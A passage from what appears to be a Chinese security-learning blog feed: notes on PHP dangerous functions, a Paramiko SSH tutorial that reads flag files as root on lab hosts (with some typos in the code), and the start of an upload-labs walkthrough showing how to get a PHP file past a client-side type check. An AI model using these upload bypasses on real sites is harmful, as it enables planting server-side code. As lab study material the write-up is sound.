会检查该文件是否已经被包含过，如果是则不会再次包含。</li><li><em>include_once</em> 语句在脚本执行期间包含并运行指定文件。此行为和 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmluY2x1ZGUucGhw">include</span> 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。</li></ul><h2 id="文件操作函数官方文档"><a class="markdownIt-Anchor" href="#文件操作函数官方文档">#</a> 文件操作函数 (官方文档)</h2><ul><li>copy  拷贝文件 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmNvcHkucGhw">http://php.net/manual/zh/function.copy.php</span></li><li>file_get_contents  将整个文件读入一个字符串 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtZ2V0LWNvbnRlbnRzLnBocA==">http://php.net/manual/zh/function.file-get-contents.php</span></li><li>file_put_contents  将一个字符串写入文件  <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUtcHV0LWNvbnRlbnRzLnBocA==">http://php.net/manual/zh/function.file-put-contents.php</span></li><li>file  把整个文件读入到一个数组中 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZpbGUucGhw">http://php.net/manual/zh/function.file.php</span></li><li>fopen  打开文件或者 URL  <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLmZvcGVuLnBocA==">http://php.net/manual/zh/function.fopen.php</span></li><li>move_uploaded_file 将上传的文件移动到新位置 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLm1vdmUtdXBsb2FkZWQtZmlsZS5waHA=">http://php.net/manual/zh/function.move-uploaded-file.php</span></li><li>readfile  输出文件 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlYWRmaWxlLnBocA==">http://php.net/manual/zh/function.readfile.php</span></li><li>rename  重命名一个文件目录 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJlbmFtZS5waHA=">http://php.net/manual/zh/function.rename.php</span></li><li>rmdir  删除目录 <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnJtZGlyLnBocA==">http://php.net/manual/zh/function.rmdir.php</span></li><li>unlink &amp; delete  删除文件  <span class="exturl" data-url="aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2Z1bmN0aW9uLnVubGluay5waHA=">http://php.net/manual/zh/function.unlink.php</span></li></ul><h2 id="特殊函数"><a class="markdownIt-Anchor" href="#特殊函数">#</a> 特殊函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phpinfo — 输出关于 PHP 配置的信息</span><br><span class="line">symlink — 建立符号连接</span><br><span class="line">readlink — 返回符号连接指向的目标</span><br><span class="line">getenv — 获取一个环境变量的值</span><br><span class="line">putenv — 设置环境变量的值</span><br><span class="line">dl — 运行时载入一个 PHP 扩展</span><br><span class="line">ini_get — 获取一个配置选项的值</span><br><span class="line">ini_set  ini_alter  ini_restore</span><br><span class="line">is_numeric - 数字判断 </span><br><span class="line">in_array 在 haystack 中搜索 needle，如果没有设置 strict 则使用宽松的比较。</span><br></pre></td></tr></table></figure><h3 id="变量覆盖"><a class="markdownIt-Anchor" href="#变量覆盖">#</a> 变量覆盖</h3><ul><li>parse_str 如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域。</li><li>extract  本函数用来将变量从数组中导入到当前的符号表中。检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。</li><li>mb_parse_str  解析 GET/POST/COOKIE 数据并设置全局变量。</li><li>import_request_variables  将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 register_globals，但又想用到一些全局变量，那么此函数就很有用。</li></ul><p>列目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">glob</span><br><span class="line"><span class="keyword">array</span> glob ( <span class="keyword">string</span> <span class="variable">$pattern</span> [, <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span> ] )</span><br><span class="line">glob() 函数依照 libc glob() 函数使用的规则寻找所有与 pattern 匹配的文件路径，类似于一般 shells 所用的规则一样。不进行缩写扩展或参数替代。</span><br></pre></td></tr></table></figure><h3 id="无参数获取信息"><a class="markdownIt-Anchor" href="#无参数获取信息">#</a> 无参数获取信息</h3><ul><li>get_defined_vars 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</li><li>get_defined_constants 返回当前所有已定义的常量名和值。 这包含 define () 函数所创建的，也包含了所有扩展所创建的。</li><li>get_defined_functions 返回一个包含所有已定义函数列表的多维数组</li><li>get_included_files 返回所有被 include、 include_once、 require 和 require_once 的文件名。</li></ul><p>php 危险函数总结</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503135420288.png" alt="image-20210503135420288"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503135446595.png" alt="image-20210503135446595"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210503135503196.png" alt="image-20210503135503196"></p>]]></content>
      
      
      
        <tags>
            
            <tag> php危险函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>paramiko模块介绍</title>
      <link href="2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/"/>
      <url>2021/05/02/paramiko%E6%A8%A1%E5%9D%97%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="paramiko模块介绍"><a class="markdownIt-Anchor" href="#paramiko模块介绍">#</a> Paramiko 模块介绍</h2><p>ssh 是一个协议，OpenSSH 是其中一个开源实现，paramiko 是 Python 的一个库，实现了 SSHv2 协议 (底层使用 cryptography)。</p><p>有了 Paramiko 以后，我们就可以在 Python 代码中直接使用 SSH 协议对远程服务器执行操作，而不是通过 ssh 命令对远程服务器进行操作。</p><p>由于 paramiko 属于第三方库，所以需要使用如下命令先行安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install paramiko</span><br></pre></td></tr></table></figure><p>paramiko 包含两个核心组件：SSHClient 和 SFTPClient。</p><ul><li>SSHClient 的作用类似于 Linux 的 ssh 命令，是对 SSH 会话的封装，该类封装了传输 (Transport)，通道 (Channel) 及 SFTPClient 建立的方法 (open_sftp)，通常用于执行远程命令。</li><li>SFTPClient 的作用类似与 Linux 的 sftp 命令，是对 SFTP 客户端的封装，用以实现远程文件操作，如文件上传、下载、修改文件权限等操作。</li></ul><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    Paramiko中的几个基础名词</span><br><span class="line"><span class="number">1</span>、Channel：是一种类Socket，一种安全的SSH传输通道；</span><br><span class="line"><span class="number">2</span>、Transport：是一种加密的会话，使用时会同步创建了一个加密的Tunnels(通道)，这个Tunnels叫做Channel；</span><br><span class="line"><span class="number">3</span>、Session：是client与Server保持连接的对象，用connect()/start_client()/start_server()开始会话。</span><br></pre></td></tr></table></figure><h2 id="paramiko的基本使用"><a class="markdownIt-Anchor" href="#paramiko的基本使用">#</a> Paramiko 的基本使用</h2><h4 id="sshclient常用的方法介绍"><a class="markdownIt-Anchor" href="#sshclient常用的方法介绍">#</a> SSHClient 常用的方法介绍</h4><p><strong>connect()</strong>：实现远程服务器的连接与认证，对于该方法只有 hostname 是必传参数。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">常用参数</span><br><span class="line">hostname 连接的目标主机</span><br><span class="line">port=SSH_PORT 指定端口</span><br><span class="line">username=None 验证的用户名</span><br><span class="line">password=None 验证的用户密码</span><br><span class="line">pkey=None 私钥方式用于身份验证</span><br><span class="line">key_filename=None 一个文件名或文件列表，指定私钥文件</span><br><span class="line">timeout=None 可选的tcp连接超时时间</span><br><span class="line">allow_agent=True, 是否允许连接到ssh代理，默认为True 允许</span><br><span class="line">look_for_keys=True 是否在~/.ssh中搜索私钥文件，默认为True 允许</span><br><span class="line">compress=False, 是否打开压缩</span><br></pre></td></tr></table></figure><p><strong>set_missing_host_key_policy()</strong>：设置远程服务器没有在 know_hosts 文件中记录时的应对策略。目前支持三种策略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设置连接的远程主机没有本地主机密钥或HostKeys对象时的策略，目前支持三种：</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AutoAddPolicy 自动添加主机名及主机密钥到本地HostKeys对象，不依赖load_system_host_key的配置。即新建立ssh连接时不需要再输入yes或no进行确认</span><br><span class="line">WarningPolicy 用于记录一个未知的主机密钥的python警告。并接受，功能上和AutoAddPolicy类似，但是会提示是新连接</span><br><span class="line">RejectPolicy 自动拒绝未知的主机名和密钥，依赖load_system_host_key的配置。此为默认选项</span><br></pre></td></tr></table></figure><p><strong>exec_command()</strong>：在远程服务器执行 Linux 命令的方法</p><p><strong>open_sftp()</strong>：在当前 ssh 会话的基础上创建一个 sftp 会话。该方法会返回一个 SFTPClient 对象。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 利用SSHClient对象的open_sftp()方法，可以直接返回一个基于当前连接的sftp对象，可以进行文件的上传等操作.</span><br><span class="line"></span><br><span class="line">sftp = client.open_sftp()</span><br><span class="line">sftp.put(&#x27;test.txt&#x27;,&#x27;text.txt&#x27;)</span><br></pre></td></tr></table></figure><h4 id="sshclient常用的方法举例"><a class="markdownIt-Anchor" href="#sshclient常用的方法举例">#</a> SSHClient 常用的方法举例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line">client = paramiko.SSHClient()  </span><br><span class="line"><span class="comment"># 实例化SSHClient</span></span><br><span class="line">client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"><span class="comment"># 自动添加策略,保存服务器的主机名和密钥，如不添加,那么不在本地know_hosts文件中记录的文件无法连接</span></span><br><span class="line">client.connect(hostname=<span class="string">&#x27;10.7.5.238&#x27;</span>,port=<span class="number">22</span>,username=<span class="string">&#x27;root&#x27;</span>,password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"><span class="comment"># 连接SSH服务端,以用户名和密码进行认证</span></span><br><span class="line">stdin, stdout, stderr = client.exec_command(<span class="string">&#x27;cat /root/flagvalue.txt&#x27;</span>)</span><br><span class="line"><span class="comment"># stdout为正确输出, stderr为错误输出, 同时是有一个变量有值</span></span><br><span class="line"><span class="built_in">print</span>(stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 打印执行结果</span></span><br><span class="line">client.close()</span><br><span class="line"><span class="comment"># 关闭SSHClient</span></span><br></pre></td></tr></table></figure><p>执行结果:</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210111092549417.png" alt="image-20210111094748230"></p><p><strong>密钥连接方式</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 配置私人密钥文件位置</span></span><br><span class="line">private = paramiko.RSAKey.from_private_key_file(<span class="string">&#x27;/Users/ch/.ssh/id_rsa&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#实例化SSHClient</span></span><br><span class="line">client = paramiko.SSHClient()</span><br><span class="line"> </span><br><span class="line"><span class="comment">#自动添加策略，保存服务器的主机名和密钥信息，如果不添加，那么不再本地know_hosts文件中记录的主机将无法连接</span></span><br><span class="line">client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#连接SSH服务端，以用户名和密码进行认证</span></span><br><span class="line">client.connect(hostname=<span class="string">&#x27;10.0.0.1&#x27;</span>,port=<span class="number">22</span>,username=<span class="string">&#x27;root&#x27;</span>,pkey=private)</span><br></pre></td></tr></table></figure><p><strong>SSHClient 封装 Transport</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="comment">#创建一个通道</span></span><br><span class="line">transport = paramiko.Transport((<span class="string">&#x27;10.7.5.238&#x27;</span>,<span class="number">22</span>))</span><br><span class="line">tarnsport.connect(username=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line">ssh = paramiko.SSHClient()</span><br><span class="line">ssh._transport = transport</span><br><span class="line"></span><br><span class="line">stdin, stdout, stderr = ssh.exec_command(<span class="string">&#x27;cat /root/flag*.txt&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(stdout.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">transport.close()</span><br></pre></td></tr></table></figure><p>执行结果:</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210111092624833.png" alt="image-20210111092549417"></p><h4 id="sftpclient常用方法介绍"><a class="markdownIt-Anchor" href="#sftpclient常用方法介绍">#</a> SFTPClient 常用方法介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SFTPCLient作为一个sftp的客户端对象，根据ssh传输协议的sftp会话，实现远程文件操作，如上传、下载、权限、状态</span><br><span class="line"> </span><br><span class="line">from_transport(cls,t) 创建一个已连通的SFTP客户端通道</span><br><span class="line">put(localpath, remotepath, callback=None, confirm=True) 将本地文件上传到服务器 参数confirm：是否调用stat()方法检查文件状态，返回ls -l的结果</span><br><span class="line">get(remotepath, localpath, callback=None) 从服务器下载文件到本地</span><br><span class="line">mkdir() 在服务器上创建目录</span><br><span class="line">remove() 在服务器上删除目录</span><br><span class="line">rename() 在服务器上重命名目录</span><br><span class="line">stat() 查看服务器文件状态</span><br><span class="line">listdir() 列出服务器目录下的文件</span><br></pre></td></tr></table></figure><h4 id="sftpclient常用方法举例"><a class="markdownIt-Anchor" href="#sftpclient常用方法举例">#</a> SFTPClient 常用方法举例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="comment"># 获取Transport实例</span></span><br><span class="line">tran = paramiko.Transpor((<span class="string">&#x27;10.7.5.238&#x27;</span>,<span class="number">22</span>))</span><br><span class="line"><span class="comment"># 连接SSH服务端</span></span><br><span class="line">tran.connect(username=<span class="string">&#x27;root&#x27;</span>,password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取SFTP实例</span></span><br><span class="line">sftp = paramiko.SFTPClient.from_transport(tran)</span><br><span class="line"><span class="comment"># 设置上传的文件/远程文件路径</span></span><br><span class="line">localpath = <span class="string">&#x27;/root/1.txt&#x27;</span></span><br><span class="line">remotepath = <span class="string">&#x27;/root/1.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行上传动作</span></span><br><span class="line">sftp.put(localpath, remotepath)</span><br><span class="line"><span class="comment"># 执行下载动作</span></span><br><span class="line">sftp.get(remotepath, localpath)</span><br><span class="line"></span><br><span class="line">tran.close()</span><br></pre></td></tr></table></figure><p>执行结果:</p><p>客户端</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210111094758768.png" alt="image-20210111094758768"></p><p>服务端</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210111094758768.png" alt="image-20210111094758768"></p><h3 id="paramiko的综合使用例子"><a class="markdownIt-Anchor" href="#paramiko的综合使用例子">#</a> Paramiko 的综合使用例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SSHConnection</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host_dict</span>):</span></span><br><span class="line">        self.host = host_dict[<span class="string">&#x27;host&#x27;</span>]</span><br><span class="line">        self.port = host_dict[<span class="string">&#x27;port&#x27;</span>]</span><br><span class="line">        self.username = host_dict[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        self.pwd = host_dict[<span class="string">&#x27;pwd&#x27;</span>]</span><br><span class="line">        self.__k = <span class="literal">None</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        transport = paramiko.Transport((self.host,self.port))</span><br><span class="line">        transport.connect(username=self.username,password=self.pwd)</span><br><span class="line">        self.__transport = transport</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.__transport.close()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_cmd</span>(<span class="params">self, command</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">         执行shell命令,返回字典</span></span><br><span class="line"><span class="string">         return &#123;&#x27;color&#x27;: &#x27;red&#x27;,&#x27;res&#x27;:error&#125;或</span></span><br><span class="line"><span class="string">         return &#123;&#x27;color&#x27;: &#x27;green&#x27;, &#x27;res&#x27;:res&#125;</span></span><br><span class="line"><span class="string">        :param command:</span></span><br><span class="line"><span class="string">        :return:</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        ssh = paramiko.SSHClient()</span><br><span class="line">        ssh._transport = self.__transport</span><br><span class="line">        <span class="comment"># 执行命令</span></span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(command)</span><br><span class="line">        <span class="comment"># 获取命令结果</span></span><br><span class="line">        res = unicode_utils.to_str(stdout.read())</span><br><span class="line">        <span class="comment"># 获取错误信息</span></span><br><span class="line">        error = unicode_utils.to_str(stderr.read())</span><br><span class="line">        <span class="comment"># 如果有错误信息，返回error</span></span><br><span class="line">        <span class="comment"># 否则返回res</span></span><br><span class="line">        <span class="keyword">if</span> error.strip():</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;color&#x27;</span>:<span class="string">&#x27;red&#x27;</span>,<span class="string">&#x27;res&#x27;</span>:error&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;green&#x27;</span>, <span class="string">&#x27;res&#x27;</span>:res&#125;</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">self,local_path, target_path</span>):</span></span><br><span class="line">        <span class="comment"># 连接，上传</span></span><br><span class="line">        sftp = paramiko.SFTPClient.from_transport(self.__transport)</span><br><span class="line">        <span class="comment"># 将location.py 上传至服务器 /tmp/test.py</span></span><br><span class="line">        sftp.put(local_path, target_path, confirm=<span class="literal">True</span>)</span><br><span class="line">        <span class="comment"># print(os.stat(local_path).st_mode)</span></span><br><span class="line">        <span class="comment"># 增加权限</span></span><br><span class="line">        <span class="comment"># sftp.chmod(target_path, os.stat(local_path).st_mode)</span></span><br><span class="line">        sftp.chmod(target_path, <span class="number">0o755</span>)  <span class="comment"># 注意这里的权限是八进制的，八进制需要使用0o作为前缀</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">download</span>(<span class="params">self,target_path, local_path</span>):</span></span><br><span class="line">        <span class="comment"># 连接，下载</span></span><br><span class="line">        sftp = paramiko.SFTPClient.from_transport(self.__transport)</span><br><span class="line">        <span class="comment"># 将location.py 下载至服务器 /tmp/test.py</span></span><br><span class="line">        sftp.get(target_path, local_path)</span><br><span class="line">    <span class="comment"># 销毁</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.close()　　</span><br><span class="line"><span class="comment">#unicode_utils.py</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_str</span>(<span class="params">bytes_or_str</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    把byte类型转换为str</span></span><br><span class="line"><span class="string">    :param bytes_or_str:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bytes_or_str, <span class="built_in">bytes</span>):</span><br><span class="line">        value = bytes_or_str.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        value = bytes_or_str</span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> paramiko模块介绍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-labs通关记录</title>
      <link href="2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-labs通关记录总计"><a class="markdownIt-Anchor" href="#upload-labs通关记录总计">#</a> upload-labs 通关记录总计</h1><h2 id="pass-01前端绕过"><a class="markdownIt-Anchor" href="#pass-01前端绕过">#</a> Pass-01 (前端绕过)</h2><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306140038674.png" alt="image-20210306140038674"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">三种方法：</span><br><span class="line">前端绕过，jpg改php，删除&quot;return checkFile()&quot;</span><br></pre></td></tr></table></figure><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一种方法 - 前端绕过</p><p>添加允许上传为 php 文件</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306140551825.png" alt="image-20210306140551825"></p><p>上传 a.php，成功上传</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306140637377.png" alt="image-20210306140637377"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306140716311.png" alt="image-20210306140716311"></p><p>第二种方法 - burp 抓包进行改包</p><p>上传 b.jpg 进行 burp 抓包，改为 b.php 成功上传</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306141026280.png" alt="image-20210306141026280"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306141056357.png" alt="image-20210306141056357"></p><p>第三种方法 - 删除 &quot;return checkFile ()&quot;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这个有点玄学,谷歌有时会不行,拿火狐就可以了</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306141425783.png" alt="image-20210306141425783"></p><p>成功上传 c.php</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306141515473.png" alt="image-20210306141515473"></p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210306141525686.png" alt="image-20210306141525686"></p><h2 id="pass-02jpg改包php上传"><a class="markdownIt-Anchor" href="#pass-02jpg改包php上传">#</a> Pass-02 (jpg 改包 php 上传)</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 